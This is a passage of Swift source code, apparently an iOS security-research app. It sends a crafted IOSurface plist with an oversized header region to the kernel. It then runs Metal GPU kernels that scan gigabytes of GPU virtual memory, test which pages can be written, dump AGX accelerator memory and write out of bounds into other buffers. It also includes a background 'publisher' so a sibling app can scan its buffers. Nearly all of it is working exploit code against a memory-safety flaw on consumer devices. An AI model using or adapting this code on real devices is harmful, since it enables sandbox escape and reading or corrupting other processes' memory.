        e.setBuffer(outb, offset: 0, index: 1)
        var strideWords = UInt32(page / 4)
        e.setBytes(&strideWords, length: 4, index: 2)
        e.dispatchThreads(MTLSize(width: count, height: 1, depth: 1),
                          threadsPerThreadgroup: MTLSize(width: 64, height: 1, depth: 1))
        e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
        emit("  scanned \(count) pages ?? \(cb.status == .completed ? "ok" : "fail")")

        var nonZero: [(Int, UInt32)] = []
        for i in 0..<count where ops[i] != 0 { nonZero.append((i * page, ops[i])) }
        emit("[OK] scanned 16 MiB window" ) 
        emit("     mapped: \(nonZero.count)/\(count) pages")
        for (off, v) in nonZero.prefix(6) {
            emit("     +0x\(String(off, radix: 16)): 0x\(String(v, radix: 16))")
        }

        func write(_ b: MTLBuffer, _ i: UInt32, _ v: UInt32) {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder() else { return }
            e2.setComputePipelineState(pwr); e2.setBuffer(b, offset: 0, index: 0)
            var ii = i, vv = v
            e2.setBytes(&ii, length: 4, index: 1); e2.setBytes(&vv, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
        }
        func read(_ b: MTLBuffer, _ i: UInt32) -> UInt32 {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder(),
                  let o2 = dev.makeBuffer(length: 4, options: .storageModeShared) else { return 0 }
            e2.setComputePipelineState(prd); e2.setBuffer(b, offset: 0, index: 0); e2.setBuffer(o2, offset: 0, index: 1)
            var ii = i
            e2.setBytes(&ii, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
            return o2.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }
        // Writability probe on a few mapped pages, restoring the original value.
        for (off, orig) in nonZero.prefix(3) {
            let idx = UInt32(off / 4)
            write(f1buf, idx, 0x5A5A5A5A)
            let back = read(f1buf, idx)
            write(f1buf, idx, orig)
            emit("     +0x\(String(off, radix: 16)) writable=\(back == 0x5A5A5A5A) (\(String(format: "%08x", back)))")
        }
        emit("??? done")
    }

    func f1Scan2Probe() {
        emit("??? wide GPU VA scan")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
        f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
            outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { return }
        let base = IOSurfaceGetBaseAddress(surf)
        xq_IOServiceClose(conn)
        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else { return }
        let f1ga = f1buf.gpuAddress

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void scan(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]],
                         constant int &baseWords [[buffer(2)]], constant int &stepWords [[buffer(3)]],
                         uint i [[thread_position_in_grid]]) {
            out[i] = buf[baseWords + int(i) * stepWords];
        }
        kernel void wr(device uint *buf [[buffer(0)]], constant int &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant int &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        var lib: MTLLibrary?
        do { lib = try dev.makeLibrary(source: src, options: nil) }
        catch { emit("[NO] library: \(error.localizedDescription)"); return }
        guard let lib, let fscan = lib.makeFunction(name: "scan"),
              let fwr = lib.makeFunction(name: "wr"), let frd = lib.makeFunction(name: "rd") else { emit("[NO] funcs"); return }
        var ps: MTLComputePipelineState?; var pw: MTLComputePipelineState?; var pr: MTLComputePipelineState?
        do {
            ps = try dev.makeComputePipelineState(function: fscan)
            pw = try dev.makeComputePipelineState(function: fwr)
            pr = try dev.makeComputePipelineState(function: frd)
        } catch { emit("[NO] pipeline: \(error.localizedDescription)"); return }
        guard let psc = ps, let pwr = pw, let prd = pr, let q = dev.makeCommandQueue() else { return }

        let page = 0x4000
        let spanPages = 2048                              // ??32 MiB
        let count = spanPages * 2
        guard let outb = dev.makeBuffer(length: count * 4, options: .storageModeShared) else { return }
        let ops = outb.contents().bindMemory(to: UInt32.self, capacity: count)
        guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return }
        e.setComputePipelineState(psc)
        e.setBuffer(f1buf, offset: 0, index: 0)
        e.setBuffer(outb, offset: 0, index: 1)
        var baseWords = Int32(-spanPages * (page / 4))
        var stepWords = Int32(page / 4)
        e.setBytes(&baseWords, length: 4, index: 2)
        e.setBytes(&stepWords, length: 4, index: 3)
        e.dispatchThreads(MTLSize(width: count, height: 1, depth: 1),
                          threadsPerThreadgroup: MTLSize(width: 64, height: 1, depth: 1))
        e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
        emit("  scanned \(count) pages (??32 MiB) ?? \(cb.status == .completed ? "ok" : "fail")")

        var hits: [(Int, UInt32)] = []
        for i in 0..<count where ops[i] != 0 {
            hits.append((i * page, ops[i]))
        }
        emit("[OK] wide scan done")
        emit("     mapped: \(hits.count)/\(count) pages")
        for (off, v) in hits.prefix(10) {
            let p = off - spanPages * page
            emit("     \(p >= 0 ? "+" : "-")0x\(String(abs(p), radix: 16)): 0x\(String(v, radix: 16))")
        }

        func write(_ i: Int32, _ v: UInt32) {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder() else { return }
            e2.setComputePipelineState(pwr); e2.setBuffer(f1buf, offset: 0, index: 0)
            var ii = i, vv = v
            e2.setBytes(&ii, length: 4, index: 1); e2.setBytes(&vv, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
        }
        func read(_ i: Int32) -> UInt32 {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder(),
                  let o2 = dev.makeBuffer(length: 4, options: .storageModeShared) else { return 0 }
            e2.setComputePipelineState(prd); e2.setBuffer(f1buf, offset: 0, index: 0); e2.setBuffer(o2, offset: 0, index: 1)
            var ii = i
            e2.setBytes(&ii, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
            return o2.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }
        for (off, orig) in hits.prefix(6) {
            let idx = Int32((off - spanPages * page) / 4)
            write(idx, 0x5A5A5A5A)
            let back = read(idx)
            write(idx, orig)
            emit("     \(Int(idx) * 4 >= 0 ? "+" : "-")0x\(String(abs(Int(idx) * 4), radix: 16)): ro=\(back != 0x5A5A5A5A)")
        }
        emit("??? done")
    }

    func f1DumpProbe() {
        emit("??? AGX region dump")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
        f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
            outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { return }
        let base = IOSurfaceGetBaseAddress(surf)
        xq_IOServiceClose(conn)

        var agxVA: UInt64 = 0
        if let agx = agxServiceName() {
            benchLine("     AGX service \(agx)")
            let am = agx.withCString({ xq_IOServiceMatching($0) })
            var ai: io_iterator_t = 0
            if let am, xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                var ac: io_connect_t = 0
                if asvc != 0, xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) == KERN_SUCCESS {
                    xq_IOObjectRelease(asvc)
                    var ain = [UInt8](repeating: 0, count: 0x100)
                    ain[0] = 0x82
                    ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
                    ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
                    var aout = [UInt8](repeating: 0, count: 0x1000); var aosz = 0x1000
                    ain.withUnsafeBytes { ib in aout.withUnsafeMutableBytes { ob in
                        _ = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
                    for i in 0..<8 { agxVA |= UInt64(aout[i]) << (8*i) }
                    xq_IOServiceClose(ac)
                }
            }
        }
        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else { return }
        let f1ga = f1buf.gpuAddress
        emit("  f1 0x\(String(f1ga, radix: 16)) agx 0x\(String(agxVA, radix: 16)) ?? 0x\(String(agxVA > 0 && f1ga > agxVA ? f1ga - agxVA : 0, radix: 16))")

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void rd(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]], constant int &idx [[buffer(2)]]) { out[0] = buf[idx]; }
        """
        var lib: MTLLibrary?
        do { lib = try dev.makeLibrary(source: src, options: nil) } catch { emit("[NO] lib"); return }
        guard let lib, let frd = lib.makeFunction(name: "rd"),
              let prd = try? dev.makeComputePipelineState(function: frd),
              let q = dev.makeCommandQueue() else { emit("[NO] pipe"); return }
        guard let o2 = dev.makeBuffer(length: 4, options: .storageModeShared) else { return }
        func read(_ i: Int32) -> UInt32 {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder() else { return 0 }
            e2.setComputePipelineState(prd); e2.setBuffer(f1buf, offset: 0, index: 0); e2.setBuffer(o2, offset: 0, index: 1)
            var ii = i
            e2.setBytes(&ii, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
            return o2.contents().bindMemory(to: UInt32.self, capacity: 1)[0]
        }
        // The AGX resource sits below our buffer; dump the first 64 words of it.
        for row in 0..<8 {
            var line = "     "
            for col in 0..<8 {
                let wordIdx = -(0x18000 / 4) + row * 8 + col
                let v = read(Int32(wordIdx))
                line += String(format: "%08x ", v)
            }
            emit(line)
        }
        emit("??? done")
    }

    func f1ControlProbe() {
        emit("??? 02 ?? Metal GPU VA access")
        let f1xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        xq_IOObjectRelease(svc)
        let xmlLen = f1xml.utf8.count + 1
        var outBuf = [UInt8](repeating: 0, count: 0xc68); var outSize = 0xc68; var s0: UInt64 = 0
        f1xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: xmlLen) { p in
            outBuf.withUnsafeMutableBytes { ob in xq_IOConnectCallMethod(conn, 0, &s0, 1, p, xmlLen, nil, nil, ob.baseAddress, &outSize) } } }
        func rd32(_ o: Int) -> UInt32 {
            guard o + 4 <= outBuf.count else { return 0 }
            return UInt32(outBuf[o]) | (UInt32(outBuf[o+1]) << 8) | (UInt32(outBuf[o+2]) << 16) | (UInt32(outBuf[o+3]) << 24)
        }
        let sid = outSize >= 0x1c ? rd32(0x18) : 0
        guard sid != 0, let surf = IOSurfaceLookup(sid) else { return }
        let base = IOSurfaceGetBaseAddress(surf)
        xq_IOServiceClose(conn)
        guard let dev = MTLCreateSystemDefaultDevice(),
              let f1buf = dev.makeBuffer(bytesNoCopy: base, length: 0x10000, options: .storageModeShared, deallocator: nil) else { return }
        let f1ga = f1buf.gpuAddress

        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void wr(device uint *buf [[buffer(0)]], constant int &idx [[buffer(1)]], constant uint &val [[buffer(2)]]) { buf[idx] = val; }
        """
        var lib: MTLLibrary?
        do { lib = try dev.makeLibrary(source: src, options: nil) } catch { emit("[NO] lib"); return }
        guard let lib, let fwr = lib.makeFunction(name: "wr"),
              let pwr = try? dev.makeComputePipelineState(function: fwr),
              let q = dev.makeCommandQueue() else { emit("[NO] pipe"); return }
        func write(_ b: MTLBuffer, _ idx: Int32, _ v: UInt32) {
            guard let c2 = q.makeCommandBuffer(), let e2 = c2.makeComputeCommandEncoder() else { return }
            e2.setComputePipelineState(pwr); e2.setBuffer(b, offset: 0, index: 0)
            var ii = idx, vv = v
            e2.setBytes(&ii, length: 4, index: 1); e2.setBytes(&vv, length: 4, index: 2)
            e2.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e2.endEncoding(); c2.commit(); c2.waitUntilCompleted()
        }

        // Plain 64 KiB buffer, no IOSurface involved.
        guard let plain = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        guard let victim = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { return }
        let vp = victim.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { vp[k] = 0x42424242 }
        write(victim, 0, 0x11111111)                      // map the victim's pages
        let pga = plain.gpuAddress
        let vga = victim.gpuAddress
        emit("     plain  0x\(String(pga, radix: 16))")
        emit("     victim 0x\(String(vga, radix: 16))")
        emit("     f1     0x\(String(f1ga, radix: 16))")

        // 1) write through the PLAIN buffer at the victim's VA
        if vga > pga {
            let idx = Int32((vga - pga) / 4)
            write(plain, idx, 0x50505050)
            emit("[\(vp[0] == 0x50505050 ? "OK" : "NO")] write through a plain buffer reached the victim ?? 0x\(String(vp[0], radix: 16))")
        emit("     the target was never passed to the GPU ?? its pages were mapped by an earlier touch")
        } else {
            emit("     skipped: the plain buffer sits above the victim")
        }
        // reset
        for k in 0..<0x4000 { vp[k] = 0x42424242 }
        write(victim, 0, 0x11111111)

        // 2) write through the F1 buffer at the victim's VA
        if vga > f1ga {
            let idx = Int32((vga - f1ga) / 4)
            write(f1buf, idx, 0x46464646)
            emit("[\(vp[0] == 0x46464646 ? "OK" : "NO")] write through the F1 buffer also reached it ?? 0x\(String(vp[0], radix: 16))")
        emit("     both writes land, so the IOSurface overflow is not what enables this")
        } else {
            emit("     skipped: the F1 buffer sits above the victim")
        }
        emit("??? done")
    }

    func publisherProbe() {
        emit("??? PUBLISHER process")
        let bid = Bundle.main.bundleIdentifier ?? "?"
        emit("     bundle \(bid)")
        guard let dev = MTLCreateSystemDefaultDevice() else { emit("[NO] no device"); return }
        emit("     device \(dev.name)")
        var held: [MTLBuffer] = []
        for i in 0..<4 {
            guard let b = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { continue }
            let p = b.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
            for k in 0..<0x4000 { p[k] = 0xDEAD0000 + UInt32(i) }
            held.append(b)
            emit("     buffer[\(i)] gpuAddress 0x\(String(b.gpuAddress, radix: 16))")
        }
        // Hold a background task so the sibling app can scan while we are backgrounded.
        let task = UIApplication.shared.beginBackgroundTask(withName: "f1pub") { }
        _ = task
        for _ in 0..<120 {
            Thread.sleep(forTimeInterval: 1.0)
            for (i, b) in held.enumerated() {
                NSLog("[F1PUB] buffer[%d] gpuAddress=0x%llx", i, b.gpuAddress)
            }
        }
        emit("??? publisher done")
    }

    func bigScanProbe() {
        emit("??? 06 ?? GPU VA scan")
        guard let dev = MTLCreateSystemDefaultDevice() else { emit("[NO] no device"); return }
        guard let seed = dev.makeBuffer(length: 0x10000, options: .storageModeShared) else { emit("[NO] seed"); return }
        let sp = seed.contents().bindMemory(to: UInt32.self, capacity: 0x4000)
        for k in 0..<0x4000 { sp[k] = 0x41414141 }
        // Touch through the GPU so our own pages are mapped.
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void touch(device uint *b [[buffer(0)]]) { b[0] = 0x41414141; }
        kernel void scan(device uint *buf [[buffer(0)]], device uint *out [[buffer(1)]],
                         constant long &baseWords [[buffer(2)]], constant long &stepWords [[buffer(3)]],
                         uint i [[thread_position_in_grid]]) {
            out[i] = buf[baseWords + long(i) * stepWords];
        }
        """
        var lib: MTLLibrary?
        do { lib = try dev.makeLibrary(source: src, options: nil) }
        catch { emit("[NO] library: \(error.localizedDescription)"); return }
        guard let lib, let ft = lib.makeFunction(name: "touch"), let fs = lib.makeFunction(name: "scan") else { emit("[NO] funcs"); return }
        var pt: MTLComputePipelineState?; var ps: MTLComputePipelineState?
        do {
            pt = try dev.makeComputePipelineState(function: ft)
            ps = try dev.makeComputePipelineState(function: fs)
        } catch { emit("[NO] pipeline: \(error.localizedDescription)"); return }
        guard let ptouch = pt, let pscan = ps, let q = dev.makeCommandQueue() else { return }

        if let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() {
            e.setComputePipelineState(ptouch); e.setBuffer(seed, offset: 0, index: 0)
            e.dispatchThreads(MTLSize(width: 1, height: 1, depth: 1), threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
            e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
        }
        let base = seed.gpuAddress
        emit("     base 0x\(String(base, radix: 16))")

        let page = 0x4000
        let half = 65536                                   // pages per side
        let count = half * 2                               // 2 GiB window
        guard let outb = dev.makeBuffer(length: count * 4, options: .storageModeShared) else { return }
        let ops = outb.contents().bindMemory(to: UInt32.self, capacity: count)
        guard let cb = q.makeCommandBuffer(), let e = cb.makeComputeCommandEncoder() else { return }
        e.setComputePipelineState(pscan)
        e.setBuffer(seed, offset: 0, index: 0)
        e.setBuffer(outb, offset: 0, index: 1)
        var bw = Int64(-half * (page / 4))
        var sw = Int64(page / 4)
        e.setBytes(&bw, length: 8, index: 2)
        e.setBytes(&sw, length: 8, index: 3)
        e.dispatchThreads(MTLSize(width: count, height: 1, depth: 1),
                          threadsPerThreadgroup: MTLSize(width: 256, height: 1, depth: 1))
        e.endEncoding(); cb.commit(); cb.waitUntilCompleted()
        emit("     scanned \(count) pages ?? \(cb.status == .completed ? "ok" : "fail")")

        var hits: [(Int64, UInt32)] = []
        for i in 0..<count where ops[i] != 0 {
            hits.append((Int64(i - half) * Int64(page), ops[i]))
        }
        emit("[OK] 2 GiB scan done")
        emit("     mapped: \(hits.count)/\(count) pages")
        for (off, v) in hits.prefix(12) {
            let sign = off >= 0 ? "+" : "-"
            emit("     \(sign)0x\(String(abs(off), radix: 16)): 0x\(String(v, radix: 16))")
        }
        emit("??? done")
    }

    // MARK: - bench probes (clean output, one per finding)

    func benchLine(_ s: String) { Logger.shared.log(s) }

    /// Finds the accelerator class this device actually exports, e.g.
    /// AGXAcceleratorG18P on A19 Pro, AGXAcceleratorG14P on A15. The name is
    /// read from the registry instead of being assumed per SoC.
    func agxServiceName() -> String? {
        var found: [String] = []
        if let all = "IOService".withCString({ xq_IOServiceMatching($0) }) {
            var it: io_iterator_t = 0
            if xq_IOServiceGetMatchingServices(0, all, &it) == KERN_SUCCESS {
                while true {
                    let obj = xq_IOIteratorNext(it)
                    if obj == 0 { break }
                    var buf = [CChar](repeating: 0, count: 128)
                    if xq_IOObjectGetClass(obj, &buf) == KERN_SUCCESS {
                        let cls = String(cString: buf)
                        if cls.hasPrefix("AGXAccelerator"), !found.contains(cls) {
                            found.append(cls)
                        }
                    }
                    xq_IOObjectRelease(obj)
                }
                xq_IOObjectRelease(it)
            }
        }
        for c in found { benchLine("     found class \(c)") }
        if found.isEmpty { benchLine("[NO] no AGXAccelerator class in the registry") }
        return found.first
    }

    func bench01IOSurface() {
        benchLine("??? 01 ?? IOSurface size validation")
        let xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { benchLine("[NO] IOSurfaceRoot not found"); return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { benchLine("[NO] service lookup failed"); return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
